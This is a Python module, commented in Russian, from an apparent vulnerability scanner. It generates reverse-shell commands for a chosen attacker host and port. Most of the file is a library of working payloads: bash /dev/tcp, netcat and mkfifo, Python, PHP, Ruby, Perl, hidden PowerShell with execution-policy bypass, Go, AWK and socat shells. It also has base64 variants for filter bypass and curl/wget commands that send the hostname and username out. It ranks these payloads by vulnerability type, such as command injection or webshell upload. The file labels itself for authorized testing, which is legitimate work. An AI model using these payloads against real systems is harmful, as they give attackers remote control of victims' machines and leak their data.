"""
revshell/manager.py — Генератор reverse shell команд.

Модуль ТОЛЬКО формирует команды — он НЕ выполняет их локально
и НЕ отправляет их автоматически на цель.

Архитектура:
  • ShellOption    — один вариант (имя, команда, описание)
  • ShellTemplate  — шаблон с подстановкой LHOST/LPORT
  • ReverseShellManager:
      - suggest_revshell(vuln_type, context) -> list[ShellOption]
      - build_payload(shell_option, lhost, lport) -> str
  • LocalExecGuard — хук, предотвращающий локальное выполнение
  • InteractiveShellPrompt — CLI-диалог выбора шелла

БЕЗОПАСНОСТЬ:
  Все сгенерированные команды предназначены ТОЛЬКО для отправки
  на целевую систему через уязвимость, обнаруженную сканером.
  Локальное выполнение через subprocess/os.system намеренно заблокировано.
"""

from __future__ import annotations

import logging
import shlex
import sys
from dataclasses import dataclass, field
from typing import Callable, Optional

logger = logging.getLogger(__name__)


# ══════════════════════════════════════════════════════════════════
#  LocalExecGuard — предотвращение локального выполнения
# ══════════════════════════════════════════════════════════════════

class LocalExecGuard:
    """
    Проверяет, что строка не выполняется локально.

    Все пути через ReverseShellManager намеренно НЕ вызывают
    subprocess, os.system, eval или exec.

    Этот класс — явная документация и точка аудита.
    Если вы видите прямые вызовы subprocess/os.system в этом модуле
    — это баг, а не фича.
    """

    BLOCKED_LOCAL_EXEC = frozenset({
        "subprocess", "os.system", "os.popen",
        "eval", "exec", "compile",
        "__import__", "importlib",
    })

    @classmethod
    def validate_command(cls, cmd: str) -> str:
        """
        Проверяет команду и возвращает её без изменений.
        НЕ выполняет команду.
        Логирует предупреждение если команда похожа на опасную.
        """
        cmd_lower = cmd.lower()
        danger_words = ["rm -rf", "format c:", "mkfs", "dd if=/dev/zero", ":(){:|:&};:"]
        for w in danger_words:
            if w in cmd_lower:
                logger.warning(
                    "[REVSHELL][WARN] Command contains potentially dangerous operation '%s'. "
                    "This payload targets REMOTE system only.", w
                )
        return cmd

    @classmethod
    def assert_no_local_exec(cls) -> None:
        """Вызвать в начале модуля для явной документации намерений."""
        # Мы намеренно НЕ импортируем subprocess здесь
        pass


# Явный вызов при загрузке модуля
LocalExecGuard.assert_no_local_exec()


# ══════════════════════════════════════════════════════════════════
#  ShellOption
# ══════════════════════════════════════════════════════════════════

@dataclass
class ShellOption:
    """Один вариант reverse shell."""
    id: str                        # уникальный идентификатор
    name: str                      # название для отображения
    description: str               # краткое описание
    command_template: str          # шаблон команды с {LHOST} {LPORT}
    os_hint: str = "linux"         # "linux" | "windows" | "any"
    requires: list[str] = field(default_factory=list)  # зависимости (bash, nc, python…)
    encoded: bool = False          # True если команда уже base64/url-encoded
    tags: list[str] = field(default_factory=list)

    def build(self, lhost: str, lport: int) -> str:
        """Подставляет LHOST/LPORT и возвращает готовую команду."""
        cmd = (
            self.command_template
            .replace("{LHOST}", lhost)
            .replace("{LPORT}", str(lport))
        )
        return LocalExecGuard.validate_command(cmd)


# ══════════════════════════════════════════════════════════════════
#  Библиотека шаблонов
# ══════════════════════════════════════════════════════════════════

SHELL_TEMPLATES: list[ShellOption] = [

    # ── Bash ──────────────────────────────────────────────────────
    ShellOption(
        id="bash_tcp",
        name="Bash TCP",
        description="Classic bash /dev/tcp reverse shell",
        command_template="bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        os_hint="linux",
        requires=["bash"],
        tags=["bash", "tcp", "linux"],
    ),
    ShellOption(
        id="bash_196",
        name="Bash 196",
        description="Bash reverse shell (variant with 196)",
        command_template="0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
        os_hint="linux",
        requires=["bash"],
        tags=["bash", "tcp", "linux"],
    ),
    ShellOption(
        id="bash_b64",
        name="Bash (base64 encoded)",
        description="Bash reverse shell wrapped in base64 for filter bypass",
        command_template=(
            "echo YmFzaCAtaSA+JiAvZGV2L3RjcC97TEhPU1R9L3tMUE9SVH0gMD4mMQ== "
            "| base64 -d | bash"
        ),
        os_hint="linux",
        requires=["bash", "base64"],
        encoded=True,
        tags=["bash", "encoded", "bypass"],
    ),

    # ── Netcat ────────────────────────────────────────────────────
    ShellOption(
        id="nc_traditional",
        name="Netcat (traditional)",
        description="Netcat with -e flag (traditional nc)",
        command_template="nc -e /bin/sh {LHOST} {LPORT}",
        os_hint="linux",
        requires=["nc"],
        tags=["nc", "netcat", "linux"],
    ),
    ShellOption(
        id="nc_openbsd",
        name="Netcat (OpenBSD / no -e)",
        description="OpenBSD netcat without -e flag",
        command_template="rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} >/tmp/f",
        os_hint="linux",
        requires=["nc", "mkfifo"],
        tags=["nc", "netcat", "linux", "openbsd"],
    ),
    ShellOption(
        id="nc_windows",
        name="Netcat (Windows)",
        description="Netcat reverse shell for Windows",
        command_template="nc.exe -e cmd.exe {LHOST} {LPORT}",
        os_hint="windows",
        requires=["nc.exe"],
        tags=["nc", "netcat", "windows"],
    ),
    ShellOption(
        id="ncat",
        name="Ncat (nmap)",
        description="ncat from nmap suite",
        command_template="ncat {LHOST} {LPORT} -e /bin/bash",
        os_hint="linux",
        requires=["ncat"],
        tags=["ncat", "nmap", "linux"],
    ),

    # ── Python ────────────────────────────────────────────────────
    ShellOption(
        id="python3_tcp",
        name="Python 3 TCP",
        description="Python 3 reverse shell via socket",
        command_template=(
            'python3 -c \'import socket,subprocess,os;'
            's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            's.connect(("{LHOST}",{LPORT}));'
            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            'p=subprocess.call(["/bin/sh","-i"])\''
        ),
        os_hint="linux",
        requires=["python3"],
        tags=["python", "python3", "linux"],
    ),
    ShellOption(
        id="python2_tcp",
        name="Python 2 TCP",
        description="Python 2 reverse shell via socket",
        command_template=(
            'python -c \'import socket,subprocess,os;'
            's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            's.connect(("{LHOST}",{LPORT}));'
            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            'p=subprocess.call(["/bin/sh","-i"])\''
        ),
        os_hint="linux",
        requires=["python"],
        tags=["python", "python2", "linux"],
    ),
    ShellOption(
        id="python_pty",
        name="Python PTY Shell",
        description="Python reverse shell with PTY (interactive)",
        command_template=(
            'python3 -c \'import pty,socket,os;'
            's=socket.socket();s.connect(("{LHOST}",{LPORT}));'
            '[os.dup2(s.fileno(),f) for f in (0,1,2)];'
            'pty.spawn("/bin/bash")\''
        ),
        os_hint="linux",
        requires=["python3"],
        tags=["python", "pty", "interactive"],
    ),

    # ── PHP ───────────────────────────────────────────────────────
    ShellOption(
        id="php_proc_open",
        name="PHP proc_open",
        description="PHP reverse shell via proc_open",
        command_template=(
            'php -r \'$sock=fsockopen("{LHOST}",{LPORT});'
            'proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$p);\''
        ),
        os_hint="linux",
        requires=["php"],
        tags=["php", "linux"],
    ),
    ShellOption(
        id="php_exec",
        name="PHP exec (one-liner)",
        description="PHP one-liner using exec",
        command_template=(
            'php -r \'exec("/bin/bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'")\''
        ),
        os_hint="linux",
        requires=["php"],
        tags=["php", "exec"],
    ),

    # ── Ruby ──────────────────────────────────────────────────────
    ShellOption(
        id="ruby_tcp",
        name="Ruby TCP",
        description="Ruby reverse shell via socket",
        command_template=(
            'ruby -rsocket -e \'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;'
            'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        ),
        os_hint="linux",
        requires=["ruby"],
        tags=["ruby", "linux"],
    ),

    # ── Perl ──────────────────────────────────────────────────────
    ShellOption(
        id="perl_tcp",
        name="Perl TCP",
        description="Perl reverse shell via socket",
        command_template=(
            'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};'
            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            'connect(S,sockaddr_in($p,inet_aton($i)));'
            'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            'exec("/bin/sh -i");\''
        ),
        os_hint="linux",
        requires=["perl"],
        tags=["perl", "linux"],
    ),

    # ── PowerShell ────────────────────────────────────────────────
    ShellOption(
        id="powershell_tcp",
        name="PowerShell TCP",
        description="PowerShell reverse shell (Windows)",
        command_template=(
            'powershell -NoP -NonI -W Hidden -Exec Bypass '
            '-Command "$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});'
            '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
            'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;'
            '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
            '$sendback = (iex $data 2>&1 | Out-String );'
            '$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';'
            '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
            '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
        ),
        os_hint="windows",
        requires=["powershell"],
        tags=["powershell", "windows"],
    ),
    ShellOption(
        id="powershell_b64",
        name="PowerShell (Base64 encoded)",
        description="PowerShell reverse shell base64-encoded (IEX bypass)",
        command_template=(
            'powershell -EncodedCommand '
            '<base64_of_payload_replace_LHOST_{LHOST}_LPORT_{LPORT}>'
        ),
        os_hint="windows",
        requires=["powershell"],
        encoded=True,
        tags=["powershell", "windows", "encoded"],
    ),

    # ── Golang ────────────────────────────────────────────────────
    ShellOption(
        id="golang_tcp",
        name="Golang TCP",
        description="Go reverse shell one-liner",
        command_template=(
            'echo "package main;import(\\"os/exec\\";'
            '\\"net\\");func main(){c,_:=net.Dial(\\"tcp\\",\\"'
            '{LHOST}:{LPORT}\\");cmd:=exec.Command(\\"/bin/sh\\");'
            'cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}" '
            '> /tmp/t.go && go run /tmp/t.go'
        ),
        os_hint="linux",
        requires=["go"],
        tags=["golang", "go"],
    ),

    # ── AWK ───────────────────────────────────────────────────────
    ShellOption(
        id="awk_tcp",
        name="AWK TCP",
        description="AWK reverse shell (useful when bash/nc unavailable)",
        command_template=(
            'awk \'BEGIN{{s="/inet/tcp/0/{LHOST}/{LPORT}";'
            'while(42){{do{{printf "shell>" |& s;s |& getline c;'
            'if(c){{while((c |& getline) > 0) print $0 |& s; close(c)}}'
            '}}while(c != "exit"); close(s)}}}}\' /dev/stdin'
        ),
        os_hint="linux",
        requires=["awk"],
        tags=["awk", "linux"],
    ),

    # ── Socat ─────────────────────────────────────────────────────
    ShellOption(
        id="socat_pty",
        name="Socat PTY (interactive)",
        description="Socat reverse shell with full PTY (best interactive experience)",
        command_template=(
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
            "tcp:{LHOST}:{LPORT}"
        ),
        os_hint="linux",
        requires=["socat"],
        tags=["socat", "pty", "interactive"],
    ),

    # ── Curl/wget OOB ─────────────────────────────────────────────
    ShellOption(
        id="curl_oob",
        name="cURL OOB (SSRF/blind detection)",
        description="Out-of-band HTTP request for blind detection (SSRF/CMDi)",
        command_template="curl http://{LHOST}:{LPORT}/$(hostname)/$(whoami)",
        os_hint="linux",
        requires=["curl"],
        tags=["oob", "curl", "detection"],
    ),
    ShellOption(
        id="wget_oob",
        name="wget OOB",
        description="Out-of-band wget for blind detection",
        command_template="wget http://{LHOST}:{LPORT}/$(whoami)",
        os_hint="linux",
        requires=["wget"],
        tags=["oob", "wget", "detection"],
    ),
]


# ══════════════════════════════════════════════════════════════════
#  Эвристики выбора шелла по типу уязвимости
# ══════════════════════════════════════════════════════════════════

VULN_TYPE_HINTS: dict[str, dict] = {
    "cmdi": {
        "preferred_tags": ["bash", "nc", "python"],
        "description": "Command injection — direct shell execution possible",
    },
    "ssti": {
        "preferred_tags": ["python", "bash"],
        "description": "SSTI — likely Python/Ruby/PHP backend",
    },
    "deserialization": {
        "preferred_tags": ["bash", "nc"],
        "description": "Deserialization RCE — OS-level command execution",
    },
    "xxe": {
        "preferred_tags": ["oob", "curl"],
        "description": "XXE — use OOB for data exfiltration",
    },
    "ssrf": {
        "preferred_tags": ["oob"],
        "description": "SSRF — use OOB for blind detection",
    },
    "file_upload_exec": {
        "preferred_tags": ["php", "bash"],
        "description": "Webshell upload — PHP or bash preferred",
    },
    "rce": {
        "preferred_tags": ["bash", "python", "nc"],
        "description": "Generic RCE",
    },
}

OS_HINTS: dict[str, str] = {
    "php": "linux",
    "django": "linux",
    "flask": "linux",
    "rails": "linux",
    "asp": "windows",
    "aspx": "windows",
    "iis": "windows",
}


# ══════════════════════════════════════════════════════════════════
#  ReverseShellManager
# ══════════════════════════════════════════════════════════════════

class ReverseShellManager:
    """
    Генератор вариантов reverse shell.

    ВАЖНО: этот класс ТОЛЬКО формирует строки команд.
    Выполнение остаётся на пользователе или на методе
    send_payload() через сканер.
    """

    def __init__(self, default_lhost: str = "10.10.10.10", default_lport: int = 4444):
        self.default_lhost = default_lhost
        self.default_lport = default_lport
        self._templates = {t.id: t for t in SHELL_TEMPLATES}

    # ── Публичный API ─────────────────────────────────────────────

    def suggest_revshell(
        self,
        vuln_type: str,
        context: Optional[dict] = None,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
        os_hint: Optional[str] = None,
        max_suggestions: int = 5,
    ) -> list[ShellOption]:
        """
        Возвращает список рекомендуемых вариантов reverse shell
        для данного типа уязвимости.

        context может содержать:
          - "tech_stack": ["php", "python", "java", ...]
          - "os": "linux" | "windows"
          - "available": ["bash", "python3", "nc", ...]
        """
        ctx = context or {}
        resolved_lhost = lhost or self.default_lhost
        resolved_lport = lport or self.default_lport

        # Определить целевую ОС
        target_os = os_hint or ctx.get("os", "linux")
        tech_stack = ctx.get("tech_stack", [])

        # Уточнить ОС по стеку
        for tech, os_name in OS_HINTS.items():
            if any(tech.lower() in s.lower() for s in tech_stack):
                target_os = os_name
                break

        # Получить предпочтительные теги для данного типа уязвимости
        hints = VULN_TYPE_HINTS.get(vuln_type.lower(), {})
        preferred_tags = hints.get("preferred_tags", ["bash", "python", "nc"])

        # Отфильтровать шаблоны по ОС
        candidates = [
            t for t in self._templates.values()
            if t.os_hint == target_os or t.os_hint == "any"
        ]

        # Приоритизировать по preferred_tags
        def priority(shell: ShellOption) -> int:
            score = 0
            for i, tag in enumerate(preferred_tags):
                if tag in shell.tags:
                    score += (len(preferred_tags) - i) * 10
            return score

        candidates.sort(key=priority, reverse=True)
        return candidates[:max_suggestions]

    def build_payload(
        self,
        shell_id: str,
        lhost: Optional[str] = None,
        lport: Optional[int] = None,
    ) -> Optional[str]:
        """
        Строит готовую команду по ID шаблона.
        НЕ выполняет локально.
        """
        template = self._templates.get(shell_id)
        if not template:
            return None
        return template.build(
            lhost=lhost or self.default_lhost,
            lport=lport or self.default_lport,
        )

    def all_options(self, os_filter: Optional[str] = None) -> list[ShellOption]:
        result = list(self._templates.values())
        if os_filter:
            result = [t for t in result if t.os_hint == os_filter or t.os_hint == "any"]
        return result

    def get_option(self, shell_id: str) -> Optional[ShellOption]:
        return self._templates.get(shell_id)

    def format_suggestion_table(
        self,
        options: list[ShellOption],
        lhost: str,
        lport: int,
    ) -> str:
        """Форматирует список вариантов для вывода в CLI/лог."""
        lines = [
            "┌─ Reverse Shell Suggestions ─────────────────────────────┐",
            f"│  LHOST: {lhost}  LPORT: {lport}",
            "├──────────────────────────────────────────────────────────┤",
        ]
        for i, opt in enumerate(options, 1):
            lines.append(f"│  [{i}] {opt.name}  ({opt.os_hint})")
            lines.append(f"│      {opt.description}")
            cmd = opt.build(lhost, lport)
            # wrap long commands
            if len(cmd) > 70:
                cmd = cmd[:70] + "…"
            lines.append(f"│      CMD: {cmd}")
            lines.append("│")
        lines.append("└──────────────────────────────────────────────────────────┘")
        return "\n".join(lines)

    def __repr__(self) -> str:
        return f"<ReverseShellManager templates={len(self._templates)}>"


# ══════════════════════════════════════════════════════════════════
#  InteractiveShellPrompt — CLI-диалог
# ══════════════════════════════════════════════════════════════════

class InteractiveShellPrompt:
    """
    Интерактивный CLI-диалог для предложения reverse shell.

    Вызывается из GUI или CLI при обнаружении RCE-подобной уязвимости.
    НЕ выполняет команды — только предлагает.
    """

    def __init__(
        self,
        manager: Optional[ReverseShellManager] = None,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.mgr = manager or ReverseShellManager()
        self.log = log_callback or print

    def prompt(
        self,
        finding,  # Finding dataclass
        lhost: str = "",
        lport: int = 4444,
    ) -> Optional[str]:
        """
        Предлагает пользователю выбрать reverse shell.
        Возвращает готовую команду или None (если пользователь отказался).

        finding: объект Finding из checks/base.py
        """
        vuln_type = getattr(finding, "vuln_type", "rce")
        url = getattr(finding, "url", "unknown")
        evidence = getattr(finding, "evidence", "")

        self.log(
            f"\n[REVSHELL] ════════════════════════════════════════════"
        )
        self.log(f"[REVSHELL] Обнаружена уязвимость: {vuln_type.upper()}")
        self.log(f"[REVSHELL] URL: {url}")
        self.log(f"[REVSHELL] Evidence: {evidence[:100]}")
        self.log(
            "[REVSHELL] ⚠  Предлагается ТОЛЬКО для авторизованного тестирования."
        )
        self.log("[REVSHELL] ════════════════════════════════════════════\n")

        # Предупреждение о рисках
        self.log(
            "[REVSHELL][WARN] Вы собираетесь сгенерировать reverse shell payload.\n"
            "         Команда будет только ОТОБРАЖЕНА — НЕ выполнена локально.\n"
            "         Для отправки используйте Send payload через сканер.\n"
        )

        answer = self._ask("Хотите просмотреть варианты reverse shell? [y/N]: ")
        if answer.lower() not in ("y", "yes", "да"):
            self.log("[REVSHELL] Пропущено.")
            return None

        # Запросить LHOST/LPORT
        lhost_input = self._ask(f"LHOST [{lhost or '10.10.10.10'}]: ").strip()
        if lhost_input:
            lhost = lhost_input
        else:
            lhost = lhost or "10.10.10.10"

        lport_input = self._ask(f"LPORT [{lport}]: ").strip()
        if lport_input.isdigit():
            lport = int(lport_input)

        # Получить варианты
        options = self.mgr.suggest_revshell(vuln_type, lhost=lhost, lport=lport)
        if not options:
            self.log("[REVSHELL] Нет подходящих вариантов.")
            return None

        self.log(self.mgr.format_suggestion_table(options, lhost, lport))

        choice = self._ask(f"Выберите вариант [1-{len(options)}] или Enter для пропуска: ").strip()
        if not choice.isdigit():
            self.log("[REVSHELL] Пропущено.")
            return None

        idx = int(choice) - 1
        if idx < 0 or idx >= len(options):
            self.log("[REVSHELL] Неверный номер.")
            return None

        chosen = options[idx]
        cmd = chosen.build(lhost, lport)

        self.log(f"\n[REVSHELL] Выбран: {chosen.name}")
        self.log(f"[REVSHELL] Команда для отправки на цель:")
        self.log(f"\n    {cmd}\n")
        self.log(
            "[REVSHELL] Для приёма соединения откройте listener:\n"
            f"    nc -lvnp {lport}"
        )

        return cmd

    def _ask(self, prompt_text: str) -> str:
        """Безопасный ввод — НЕ eval, НЕ exec."""
        try:
            return input(prompt_text)
        except (EOFError, KeyboardInterrupt):
            return ""

    def gui_suggest(
        self,
        finding,
        lhost: str = "10.10.10.10",
        lport: int = 4444,
    ) -> dict:
        """
        Возвращает данные для GUI-диалога (tkinter/etc) без блокирующего input().

        Возвращает:
          {
            "vuln_type": ...,
            "evidence": ...,
            "options": [{"id": ..., "name": ..., "cmd": ..., "os": ...}, ...],
            "lhost": ...,
            "lport": ...,
          }
        """
        vuln_type = getattr(finding, "vuln_type", "rce")
        options = self.mgr.suggest_revshell(vuln_type, lhost=lhost, lport=lport)
        return {
            "vuln_type": vuln_type,
            "evidence": getattr(finding, "evidence", ""),
            "url": getattr(finding, "url", ""),
            "options": [
                {
                    "id": opt.id,
                    "name": opt.name,
                    "description": opt.description,
                    "cmd": opt.build(lhost, lport),
                    "os": opt.os_hint,
                    "requires": opt.requires,
                }
                for opt in options
            ],
            "lhost": lhost,
            "lport": lport,
        }
